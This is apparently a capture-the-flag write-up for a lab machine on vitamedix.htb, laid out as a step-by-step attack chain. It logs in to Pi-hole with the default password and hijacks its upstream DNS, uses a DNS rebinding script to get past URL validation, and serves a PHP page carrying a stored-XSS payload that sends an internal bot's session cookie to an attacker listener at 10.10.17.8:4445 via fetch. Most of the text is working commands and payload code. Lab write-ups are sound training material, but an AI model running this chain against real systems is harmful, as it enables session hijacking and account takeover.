### Prerequisites

- Attacker machine IP: 10.10.17.8
    
      
    
- Pi-hole admin access already obtained via password `pihole`
    
      
    
- A valid user session on www.vitamedix.htb to submit a document URL
    
      
    

### Step 1 — Hijack DNS resolution in Pi-hole

1. Log in to Pi-hole at `[http://dns.vitamedix.htb:8006/admin/login.php](http://dns.vitamedix.htb:8006/admin/login.php)` with password `pihole`.
    
      
    
2. Navigate to Settings → DNS:
    
      
    
    Plaintext
    
    ```
    http://dns.vitamedix.htb:8006/admin/settings.php?tab=dns
    ```
    
3. Under Upstream DNS Servers → Custom 1 (IPv4), enter the attacker IP:
    
      
    
    Plaintext
    
    ```
    10.10.17.8
    ```
    
4. Remove or disable all other upstream DNS servers.
    
      
    
5. Click Save.
    
      
    

From this point, all DNS queries routed through Pi-hole will be answered by the attacker machine, allowing controlled resolution of www.vitamedix.htb.

  

### Step 2 — Start the DNS rebinder

On the attacker machine, run:

  

Bash

```
sudo python3 dnsrebinder.py \
  --domain www.vitamedix.htb \
  --rebind 10.10.17.8 \
  --ip 1.1.1.1 \
  --counter 1 \
  --tcp --udp
```

**Behavior:**

  

- The first DNS query for www.vitamedix.htb resolves to 1.1.1.1 (passes the application’s URL validation).
    
      
    
- Every subsequent query resolves to 10.10.17.8 (the attacker machine).
    
      
    

### Step 3 — Prepare attacker servers

#### PHP server on port 4444

Create `redirect.php` in the web root:

  

PHP

```
<?php
// Serve the payload that runs inside the bot's browser
header('Content-Type: text/html');
$xss = '<img src=x onerror=\"fetch(\'http://www.vitamedix.htb/api/settings\',{' .
       'method:\'POST\',' .
       'headers:{\'Content-Type\':\'application/json\'},' .
       'body:JSON.stringify({full_name:\\\'<img src=x onerror=fetch(`http://10.10.17.8:4445/?c=`+document.cookie)>\',address:\\\'x\\\'})' .
       '}).then(()=>location.href=\\\'http://www.vitamedix.htb/settings\\\')\">';
echo $xss;
?>
```

Start the PHP server:

  

Bash

```
php -S 0.0.0.0:4444
```

#### Cookie listener on port 4445

Start a Python listener:

  

Bash

```
python3 -m http.server 4445
```

### Step 4 — Submit the malicious document URL

1. Log in to `[http://www.vitamedix.htb](http://www.vitamedix.htb)`.
    
      
    
2. Go to the dashboard and open the Submit documents dialog.
    
      
    
3. Enter the URL:
    
      
    
    Plaintext
    
    ```
    http://www.vitamedix.htb:4444/redirect.php
    ```
    
4. Click Submit.
    
      
    

The application validates the URL: `URLHelper.validate` resolves www.vitamedix.htb to 1.1.1.1, which is not blacklisted, so the URL is accepted. The internal bot then visits the same URL.

  

By that time, DNS has rebound to 10.10.17.8, so the bot loads `redirect.php` from the attacker server.

  

### Step 5 — Payload execution in the bot’s browser

The bot loads `redirect.php`, which executes JavaScript in the bot’s authenticated browser context:

  

1. The script sends a POST request to `[http://www.vitamedix.htb/api/settings](http://www.vitamedix.htb/api/settings)` with the body:
    
      
    
    JSON
    
    ```
    {
      "full_name": "<img src=x onerror=fetch('http://10.10.17.8:4445/?c='+document.cookie)>",
      "address": "x"
    }
    ```
    
    Because the session cookie is scoped to www.vitamedix.htb and lacks SameSite protection, the browser sends the cookie with this cross-origin request. The settings update succeeds.
    
      
    
2. After the update, the script redirects the bot to:
    
    Plaintext
    
    ```
    http://www.vitamedix.htb/settings
    ```